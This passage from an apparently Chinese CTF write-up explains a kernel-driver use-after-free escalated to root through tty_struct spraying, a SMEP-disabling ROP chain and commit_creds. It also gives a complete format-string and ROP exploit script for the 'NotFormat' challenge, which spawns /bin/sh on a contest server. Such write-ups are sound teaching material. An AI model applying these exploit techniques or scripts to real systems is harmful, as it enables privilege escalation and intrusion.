<p>&#x5173;&#x4E8E;&#x9A71;&#x52A8;&#x901A;&#x4FE1;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x4ECB;&#x7ECD;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4E0D;&#x591A;&#x4ECB;&#x7ECD;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x9A71;&#x52A8;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x4F2A;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x5F15;&#x53D1;&#x7684;UAF&#x6F0F;&#x6D1E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;open(/dev/babydev,O_RDWR)&#x6253;&#x5F00;&#x4E24;&#x4E2A;&#x8BBE;&#x5907;A&#x548C;B&#xFF0C;&#x968F;&#x540E;&#x901A;&#x8FC7;ioctl&#x4F1A;&#x91CA;&#x653E;&#x6389;babyopen&#x51FD;&#x6570;&#x6267;&#x884C;&#x65F6;&#x521D;&#x59CB;&#x5316;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x800C;ioctl&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x7684;&#x5927;&#x5C0F;&#x3002;</p>
<pre class="language-"><code>__int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4)
{
  _fentry__(filp, command, arg, a4);
  v5 = v4;
  if ( (_DWORD)command == 65537 )//COMMAND&#x9700;&#x8981;&#x4E3A;0x10001
  {
    kfree(babydev_struct.device_buf);//&#x91CA;&#x653E;&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F4;
    LODWORD(v6) = _kmalloc(v5, 37748928LL);//&#x7533;&#x8BF7;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x7A7A;&#x95F4;
    babydev_struct.device_buf = v6;
    babydev_struct.device_buf_len = v5;
    printk(&quot;alloc donen&quot;, 37748928LL);
    result = 0LL;
  }
  else
  {
    printk(&amp;unk_2EB, v4);
    result = -22LL;
  }
  return result;
}
</code></pre><p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7533;&#x8BF7;&#x7684;buffer&#x53EF;&#x63A7;&#xFF0C;&#x518D;&#x4ED4;&#x7EC6;&#x770B;write&#x548C;read&#x51FD;&#x6570;&#xFF0C;&#x90FD;&#x505A;&#x4E86;&#x4E25;&#x683C;&#x7684;&#x5224;&#x65AD;&#x63A7;&#x5236;&#xFF0C;&#x4F3C;&#x4E4E;&#x6F0F;&#x6D1E;&#x4E0D;&#x5728;&#x8FD9;&#x91CC;&#x3002;</p>
<pre class="language-"><code>  if ( babydev_struct.device_buf )//&#x5224;&#x65AD;buf&#x5FC5;&#x987B;&#x6709;&#x503C;
  {
    result = -2LL;
    if ( babydev_struct.device_buf_len &gt; v4 )//&#x5224;&#x65AD;malloc&#x7684;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x5927;&#x4E8E;&#x7528;&#x6237;&#x8BFB;&#x5199;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;
</code></pre><p>&#x6B63;&#x5982;&#x4E4B;&#x524D;&#x6240;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;&#x4E00;&#x4E2A;&#x4F2A;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x5F15;&#x53D1;&#x7684;UAF&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;open&#x7533;&#x8BF7;&#x4E24;&#x4E2A;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#x548C;B&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x91CA;&#x653E;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#xFF0C;&#x901A;&#x8FC7;close&#x5173;&#x95ED;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;B&#x5728;&#x4F7F;&#x7528;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#x7684;buffer&#x7A7A;&#x95F4;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;A&#x548C;B&#x5728;&#x4F7F;&#x7528;&#x540C;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x3002;</p>
<p>&#x56E0;&#x6B64;&#xFF0C;&#x91CA;&#x653E;&#x8BBE;&#x5907;A&#x540E;&#xFF0C;&#x5F53;&#x524D;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;&#x6210;&#x4E3A;&#x91CA;&#x653E;&#x72B6;&#x6001;&#xFF0C;&#x4F46;&#x901A;&#x8FC7;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;B&#x53EF;&#x4EE5;&#x8C03;&#x7528;write/read&#x51FD;&#x6570;&#x8BFB;&#x5199;&#x8BE5;&#x7A7A;&#x95F4;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;poc&#xFF0C;&#x901A;&#x8FC7;open&#x7533;&#x8BF7;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#x548C;B&#xFF0C;ioctl&#x5BF9;A&#x548C;B&#x521D;&#x59CB;&#x5316;&#x4E00;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x901A;&#x8FC7;kmalloc&#x7533;&#x8BF7;&#x7684;&#x7A7A;&#x95F4;&#x521D;&#x59CB;&#x5316;&#x540E;&#x90FD;&#x4E3A;0&#xFF0C;&#x968F;&#x540E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;close&#x7684;&#x65B9;&#x6CD5;&#x5173;&#x95ED;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;A&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x518D;&#x901A;&#x8FC7;write&#xFF0C;&#x5411;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;B&#x7684;buffer&#x5199;&#x5165;&#x3002;</p>
<p>&#x9996;&#x5148;&#x4F1A;&#x5C06;buffer&#x7684;&#x503C;&#x4EA4;&#x7ED9;rdi&#xFF0C;&#x5E76;&#x4E14;&#x505A;&#x4E00;&#x6B21;&#x68C0;&#x67E5;&#x3002;</p>
<pre class="language-"><code>.text:00000000000000F5 ; 7:   if ( babydev_struct.device_buf )
.text:00000000000000F5                 mov     filp, cs:babydev_struct.device_buf
.text:00000000000000FC                 test    rdi, rdi
.text:00000000000000FF                 jz      short loc_125
</code></pre><p>rdi&#x5BC4;&#x5B58;&#x5668;&#x5B58;&#x653E;&#x7684;&#x5C31;&#x662F;buffer&#x6307;&#x9488;&#x3002;
     <a href="http://p9.qhimg.com/t0184ce6c7a069070ff.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p9.qhimg.com/t0184ce6c7a069070ff.png" alt="">
     </a></p>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;&#x7684;&#x503C;&#x5DF2;&#x7ECF;&#x4E0D;&#x662F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x5019;&#x8986;&#x76D6;&#x7684;&#x5168;0&#x4E86;&#x3002;</p>
<p>     <a href="http://p5.qhimg.com/t01aee71b75581d68d9.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p5.qhimg.com/t01aee71b75581d68d9.png" alt="">
     </a></p>
<p>&#x5F53;&#x524D;&#x76EE;&#x6807;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5DF2;&#x7ECF;&#x7531;&#x4E8E;&#x91CA;&#x653E;&#x5BFC;&#x81F4;&#x5F88;&#x591A;&#x5185;&#x5BB9;&#x4E0D;&#x4E3A;0&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;read&#x7684;&#x65B9;&#x6CD5;&#x8BFB;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x5740;&#xFF0C;&#x83B7;&#x53D6;&#x5730;&#x5740;&#x6CC4;&#x9732;&#x7684;&#x80FD;&#x529B;&#x3002;</p>
<p>     <a href="http://p8.qhimg.com/t01d3c74253c4db31c3.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p8.qhimg.com/t01d3c74253c4db31c3.png" alt="">
     </a></p>
<p>&#x5728;test&#x4E4B;&#x540E;&#x6CC4;&#x9732;&#x51FA;&#x6765;&#x4E86;&#x4E00;&#x4E9B;&#x989D;&#x5916;&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;read&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x8FDB;&#x884C;info leak&#x3002;</p>
<p>0x02 Exploit</p>
<p>&#x65E2;&#x7136;&#x8FD9;&#x7247;&#x7A7A;&#x95F4;&#x662F;&#x91CA;&#x653E;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x4E2A;&#x7A7A;&#x95F4;&#x8986;&#x76D6;&#x5BF9;&#x8C61;&#xFF0C;&#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BF9;&#x8BBE;&#x5907;B&#x7684;write/read&#x64CD;&#x4F5C;&#xFF0C;&#x8FBE;&#x5230;&#x5BF9;&#x8FD9;&#x4E2A;&#x5185;&#x6838;&#x5BF9;&#x8C61;&#x7684;&#x8BFB;&#x5199;&#x80FD;&#x529B;&#xFF0C;ling&#x63D0;&#x5230;&#x4E86;tty_struct&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x8FD9;&#x662F;Linux&#x9A71;&#x52A8;&#x901A;&#x4FE1;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x5173;&#x4E8E;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53BB;&#x7F51;&#x4E0A;&#x641C;&#x5230;&#x3002;</p>
<p>&#x4E8E;&#x662F;&#x6574;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x6BD4;&#x8F83;&#x660E;&#x6717;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x6765;&#x5236;&#x9020;&#x4E00;&#x4E2A;hole&#xFF0C;&#x8FD9;&#x4E2A;hole&#x7684;&#x5927;&#x5C0F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;ioctl&#x63A7;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x5176;&#x63A7;&#x5236;&#x6210;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5927;&#x5C0F;0x2e0&#xFF0C;&#x968F;&#x540E;close&#x5173;&#x95ED;&#x8BBE;&#x5907;A&#xFF0C;&#x901A;&#x8FC7;open(/dev/ptmx)&#x7684;&#x65B9;&#x6CD5;&#x7533;&#x8BF7;&#x5927;&#x91CF;&#x7684;tty_struct&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x786E;&#x4FDD;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x4F53;&#x80FD;&#x591F;&#x5360;&#x7528;&#x5230;&#x8FD9;&#x4E2A;hole&#xFF0C;&#x4E4B;&#x540E;&#x901A;&#x8FC7;&#x5BF9;&#x8BBE;&#x5907;B&#x8C03;&#x7528;write/read&#x51FD;&#x6570;&#x5B8C;&#x6210;&#x5BF9;tty_struct&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x63A7;&#x5236;&#x3002;</p>
<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6309;&#x7167;&#x4E0A;&#x9762;&#x601D;&#x8DEF;&#xFF0C;&#x7F16;&#x5199;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;poc&#x3002;</p>
<pre class="language-"><code>    fd = open(&quot;/dev/babydev&quot;,O_RDWR);
    fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);
    //init babydev_struct
    printf(&quot;Init buffer for tty_struct,%dn&quot;,sizeof(tty));
    ioctl(fd,COMMAND,0x2e0);
    ioctl(fd1,COMMAND,0x2e0);
</code></pre><p>&#x5F53;close(fd)&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;open&#x7684;&#x65B9;&#x6CD5;&#x8986;&#x76D6;tty_struct&#xFF0C;&#x540C;&#x65F6;&#x5411;tty_struct&#x5F00;&#x5934;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x5199;&#x5165;test&#x6570;&#x636E;&#xFF0C;&#x9000;&#x51FA;&#x65F6;&#x4F1A;&#x7531;&#x4E8E;tty_struct&#x5F00;&#x5934;&#x6210;&#x5458;&#x53D8;&#x91CF;magic&#x7684;&#x503C;&#x88AB;&#x4FEE;&#x6539;&#x5BFC;&#x81F4;&#x5F02;&#x5E38;&#x3002;</p>
<p>     <a href="http://p5.qhimg.com/t01ffc8ec09de2c5083.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p5.qhimg.com/t01ffc8ec09de2c5083.png" alt="">
     </a></p>
<p>&#x63A5;&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;0CTF&#x4E2D;&#x4E00;&#x9053;&#x5F88;&#x6709;&#x610F;&#x601D;&#x7684;&#x5185;&#x6838;&#x9898;&#x76EE;KNOTE&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x5728;tty_struct&#x7684;tty_operations&#x4E2D;&#x6784;&#x9020;&#x4E00;&#x4E2A;fake oprations&#xFF0C;&#x5173;&#x952E;&#x662F;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;ioctl&#x6307;&#x9488;&#xFF0C;&#x6700;&#x540E;&#x8FBE;&#x6210;&#x63D0;&#x6743;&#x6548;&#x679C;&#x3002;</p>
<p>&#x9996;&#x5148;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5229;&#x7528;&#x8BBE;&#x5907;B&#x7684;read&#x51FD;&#x6570;&#x6765;&#x83B7;&#x5F97;&#x5360;&#x4F4D;tty_struct&#x7684;&#x5934;&#x90E8;&#x7ED3;&#x6784;&#xFF0C;&#x7136;&#x540E;&#x624D;&#x662F;tty_operations&#x3002;</p>
<p>     <a href="http://p9.qhimg.com/t01f3029c17dba24655.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p9.qhimg.com/t01f3029c17dba24655.png" alt="">
     </a></p>
<p>&#x5F53;&#x7136;&#xFF0C;&#x901A;&#x8FC7;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x542F;&#x4E86;smep&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;rop chain&#x6765;&#x5B8C;&#x6210;&#x5BF9;cr4&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x4FEE;&#x6539;&#xFF0C;&#x5C06;cr4&#x4E2D;smep&#x7684;&#x6BD4;&#x7279;&#x4F4D;&#x7F6E;0&#xFF0C;&#x6765;&#x5173;&#x95ED;smep&#x3002;</p>
<pre class="language-"><code>    unsigned long rop_chain[] = {
        poprdiret,
        0x6f0, // cr4 with smep disabled
        native_write_cr4,
        get_root_payload,
        swapgs,
        0, // dummy
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x10000, user_ss};
</code></pre><p>&#x89E3;&#x51B3;&#x4E86;SMEP&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x5B8C;&#x6210;&#x6700;&#x540E;&#x7684;&#x63D0;&#x6743;&#x4E86;&#x3002;&#x81F3;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x6574;&#x4E2A;&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x6309;&#x7167;&#x5982;&#x4E0B;&#x65B9;&#x5F0F;&#x5B8C;&#x6210;&#xFF0C;&#x9996;&#x5148;&#x5229;&#x7528;&#x8BBE;&#x5907;A&#x548C;B&#xFF0C;close&#x8BBE;&#x5907;A&#xFF0C;&#x91CA;&#x653E;buffer&#xFF0C;&#x540C;&#x65F6;&#x8BBE;&#x5907;B&#x5360;&#x7528;&#x540C;&#x4E00;&#x4E2A;buffer&#x7A7A;&#x95F4;&#xFF0C;&#x7528;tty_struct&#x5BF9;&#x8C61;&#x5360;&#x4F4D;&#xFF0C;&#x7136;&#x540E;&#x8BBE;&#x5907;B&#x7684;write/read&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5BF9;tty_struct&#x7684;&#x8BFB;&#x5199;&#x3002;</p>
<p>&#x81F3;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x6784;&#x9020;fake struct&#x6765;&#x63A7;&#x5236;rip&#x3002;</p>
<p>     <a href="http://p4.qhimg.com/t010c3a3f0e57362560.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p4.qhimg.com/t010c3a3f0e57362560.png" alt="">
     </a></p>
<p>&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x8986;&#x76D6;tty_struct&#x4E2D;&#x7684;tty_operations&#xFF0C;&#x6765;&#x5C06;fake tty_operations&#x7684;ioctl&#x51FD;&#x6570;&#x66FF;&#x6362;&#x6389;&#xFF0C;&#x6539;&#x6210;stack pivot&#xFF0C;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8C03;&#x7528;ioctl&#x51FD;&#x6570;&#x7684;&#x65F6;&#x5019;&#x76F8;&#x5F53;&#x4E8E;&#x53BB;&#x6267;&#x884C;stack pivot&#xFF0C;&#x4ECE;&#x800C;&#x63A7;&#x5236;rip&#x3002;</p>
<p>&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x4E2A;ioctl&#x7684;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;&#x4E0D;&#x80FD;&#x662F;&#x8BBE;&#x5907;B&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;tty_struct&#x55B7;&#x5C04;&#x65F6;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7684;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;&#xFF0C;tty_struct&#x7684;&#x55B7;&#x5C04;&#x4F7F;&#x7528;open&#x65B9;&#x6CD5;&#x5B8C;&#x6210;&#x3002;</p>
<pre class="language-"><code>for(i=0;i&lt;ALLOC_NUM;i++)
    {
    m_fd[i] = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);
    if(m_fd[i] == -1)
    {
        printf(&quot;The %d pmtx errorn&quot;,i);
    }
    }
</code></pre><p>&#x7531;&#x4E8E;tty_operations-&gt;ioctl&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8F6C;&#x800C;&#x53BB;&#x6267;&#x884C;stack pivot&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97;&#x63A7;&#x5236;rip&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x8FD9;&#x6837;&#x901A;&#x8FC7;stack pivot&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x6211;&#x4EEC;rop chain&#x4E86;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;get root payload&#x6765;&#x5B8C;&#x6210;&#x63D0;&#x6743;&#x3002;</p>
<pre class="language-"><code>root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}
</code></pre><p>&#x7531;&#x4E8E;&#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x73AF;&#x5883;&#x6CA1;&#x6709;KASLR&#xFF0C;&#x6240;&#x4EE5;&#x5185;&#x6838;&#x5730;&#x5740;&#x90FD;&#x6CA1;&#x6709;&#x53D8;&#x5316;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x6B7B;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x5185;&#x6838;&#x5730;&#x5740;&#x6709;&#x53D8;&#x5316;&#x4E5F;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#xFF0C;&#x901A;&#x8FC7;&#x8BBE;&#x5907;B&#x7684;read&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x5185;&#x6838;&#x5730;&#x5740;&#xFF0C;&#x7B97;&#x51FA;&#x57FA;&#x5740;&#xFF0C;&#x518D;&#x52A0;&#x4E0A;&#x504F;&#x79FB;&#xFF0C;&#x4E00;&#x6837;&#x53EF;&#x4EE5;&#x5F97;&#x5230;commit_cred&#x548C;prepare_kernel_cred&#x7684;&#x5730;&#x5740;&#x3002;</p>
<p>&#x6700;&#x540E;&#x901A;&#x8FC7;get shell&#x5B8C;&#x6210;&#x63D0;&#x6743;&#xFF0C;&#x83B7;&#x5F97;root&#x6743;&#x9650;&#x3002;</p>
<p>     <a href="http://p2.qhimg.com/t01ef8f8136c48fcf7d.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p2.qhimg.com/t01ef8f8136c48fcf7d.png" alt="">
     </a></p>
<p>     <a href="http://p0.qhimg.com/t01b929e41f6f506458.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t01b929e41f6f506458.png" alt="">
     </a></p>
<h3 id="18notformat"><a name="18notformat" class="anchor-navigation-ex-anchor" href="#18notformat"><i class="fa fa-link" aria-hidden="true"></i></a>5.3.3. 18.NotFormat</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;PWN   &#x5206;&#x503C;&#xFF1A;250&#x5206;</p>
<p>&#x660E;&#x663E;&#x7684;&#x683C;&#x5F0F;&#x5316;&#xFF0C;&#x5728;print&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8C03;&#x7528;exit&#x9000;&#x51FA;&#x4E86;&#x3002;&#x548C;0ctf&#x7684;easyprintf&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#xFF0C;&#x53C2;&#x8003;<a href="http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html&#x3002;&#x4E0E;easyprintf&#x4E0D;&#x540C;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;system&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x88F8;&#x7684;rop&#x53BB;&#x83B7;&#x53D6;shell&#x3002;" target="_blank">http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html&#x3002;&#x4E0E;easyprintf&#x4E0D;&#x540C;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;system&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x88F8;&#x7684;rop&#x53BB;&#x83B7;&#x53D6;shell&#x3002;</a></p>
<pre class="language-"><code>from threading import Thread
import operator
from zio import *
target = &apos;./NotFormat&apos;
target = (&apos;123.59.71.3&apos;, 20020)
def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return
    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != &apos;&apos;:
            io.writeline(d)
def format_write(writes, index):
    printed = 0
    payload = &apos;&apos;
    for where, what in sorted(writes.items(), key=operator.itemgetter(1)):
        delta = (what - printed) &amp; 0xffff
        if delta &gt; 0:
            if delta &lt; 8:
                payload += &apos;A&apos; * delta
            else:
                payload += &apos;%&apos; + str(delta) + &apos;x&apos;
        payload += &apos;%&apos; + str(index + where) + &apos;$hn&apos;
        printed += delta
    return payload
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), 
             print_write=COLORED(RAW, &apos;green&apos;))
    #*malloc_hook= stack_povit
    #*fake_rsp = pop_rdi_ret
    #*fake_rsp+8 = fake_rsp + 0x18
    #*fake_rsp+0x10 = read_buff
    read_buff = 0x0000000000400AEE
    pop_rdi_ret = 0x00000000004005D5
    fake_rsp = 0x006cce10
    malloc_hook =0x00000000006CB788
    stack_povit = 0x00000000004b95d8
    writes = {}
    writes[0] = stack_povit&amp;0xffff
    writes[1] = (stack_povit&gt;&gt;16)&amp;0xffff
    writes[2] = pop_rdi_ret&amp;0xffff
    writes[3] = (pop_rdi_ret&gt;&gt;16)&amp;0xffff
    writes[4] = (fake_rsp+0x18)&amp;0xffff
    writes[5] = ((fake_rsp+0x18)&gt;&gt;16)&amp;0xffff
    writes[6] = read_buff&amp;0xffff
    writes[7] = (read_buff&gt;&gt;16)&amp;0xffff
    d = format_write(writes, 13+6)
    print len(d)
    d += &apos;%&apos;+str(fake_rsp-0x20)+&apos;s&apos;
    d = d.ljust(13*8, &apos;a&apos;)
    d += l64(malloc_hook) + l64(malloc_hook+2)
    d += l64(fake_rsp) + l64(fake_rsp+2)
    d += l64(fake_rsp+8) + l64(fake_rsp+10)
    d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12)
    print len(d)
    io.gdb_hint()
    io.read_until(&apos;!&apos;)
    io.writeline(d)
    pop_rax_ret = 0x00000000004C2358
    pop_rdx_rsi_ret = 0x0000000000442c69
    syscall = 0x000000000043EE45
    rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8)
    rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0)
    rop+= l64(pop_rax_ret) + l64(0x3b)
    rop += l64(syscall)
    rop += &apos;/bin/shx00&apos;
    rop += &apos;/bin/shx00&apos;
    rop += &apos;/bin/shx00&apos;
    io.writeline(rop)
    interact(io)
exp(target)
</code></pre><h2 id="&#x4E09;&#x3001;misc"><a name="&#x4E09;&#x3001;misc" class="anchor-navigation-ex-anchor" href="#&#x4E09;&#x3001;misc"><i class="fa fa-link" aria-hidden="true"></i></a>5.4. &#x4E09;&#x3001;MISC</h2>
<h3 id="4&#x4F20;&#x611F;&#x5668;1"><a name="4&#x4F20;&#x611F;&#x5668;1" class="anchor-navigation-ex-anchor" href="#4&#x4F20;&#x611F;&#x5668;1"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.1. 4.&#x4F20;&#x611F;&#x5668;1</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;MISC    &#x5206;&#x503C;&#xFF1A;100&#x5206;</p>
<p>&#x5DEE;&#x5206;&#x66FC;&#x5F7B;&#x65AF;&#x7279;</p>
<pre class="language-"><code>from Crypto.Util.number import *
id1 = 0x8893CA58
msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556
msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656
print hex(msg1 ^ msg2).upper()
s = bin(msg2)[6:]
print s
r=&quot;&quot;
tmp = 0
for i in xrange(len(s)/2):
c = s[i*2]
if c == s[i*2 - 1]:
r += &apos;1&apos;
else:
r += &apos;0&apos;
print hex(int(r,2)).upper()
</code></pre><h3 id="6warmup"><a name="6warmup" class="anchor-navigation-ex-anchor" href="#6warmup"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.2. 6.warmup</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;MISC    &#x5206;&#x503C;&#xFF1A;100&#x5206;
&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x6587;&#x4EF6;open_forum.png&#xFF0C;&#x731C;&#x6D4B;&#x662F;&#x5DF2;&#x77E5;&#x660E;&#x6587;&#xFF0C;&#x540E;&#x6765;google&#x641E;&#x4E0D;&#x5230;&#x539F;&#x56FE;&#xFF0C;&#x5B98;&#x65B9;&#x7684;hint</p>
<p>     <a href="http://p0.qhimg.com/t01788f2ce0206a80b1.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t01788f2ce0206a80b1.png" alt="">
     </a></p>
<p>     <a href="http://p2.qhimg.com/t01961ada31d0d724f5.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p2.qhimg.com/t01961ada31d0d724f5.png" alt="">
     </a></p>
<p>     <a href="http://p0.qhimg.com/t017948948c62d20d48.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t017948948c62d20d48.png" alt="">
     </a></p>
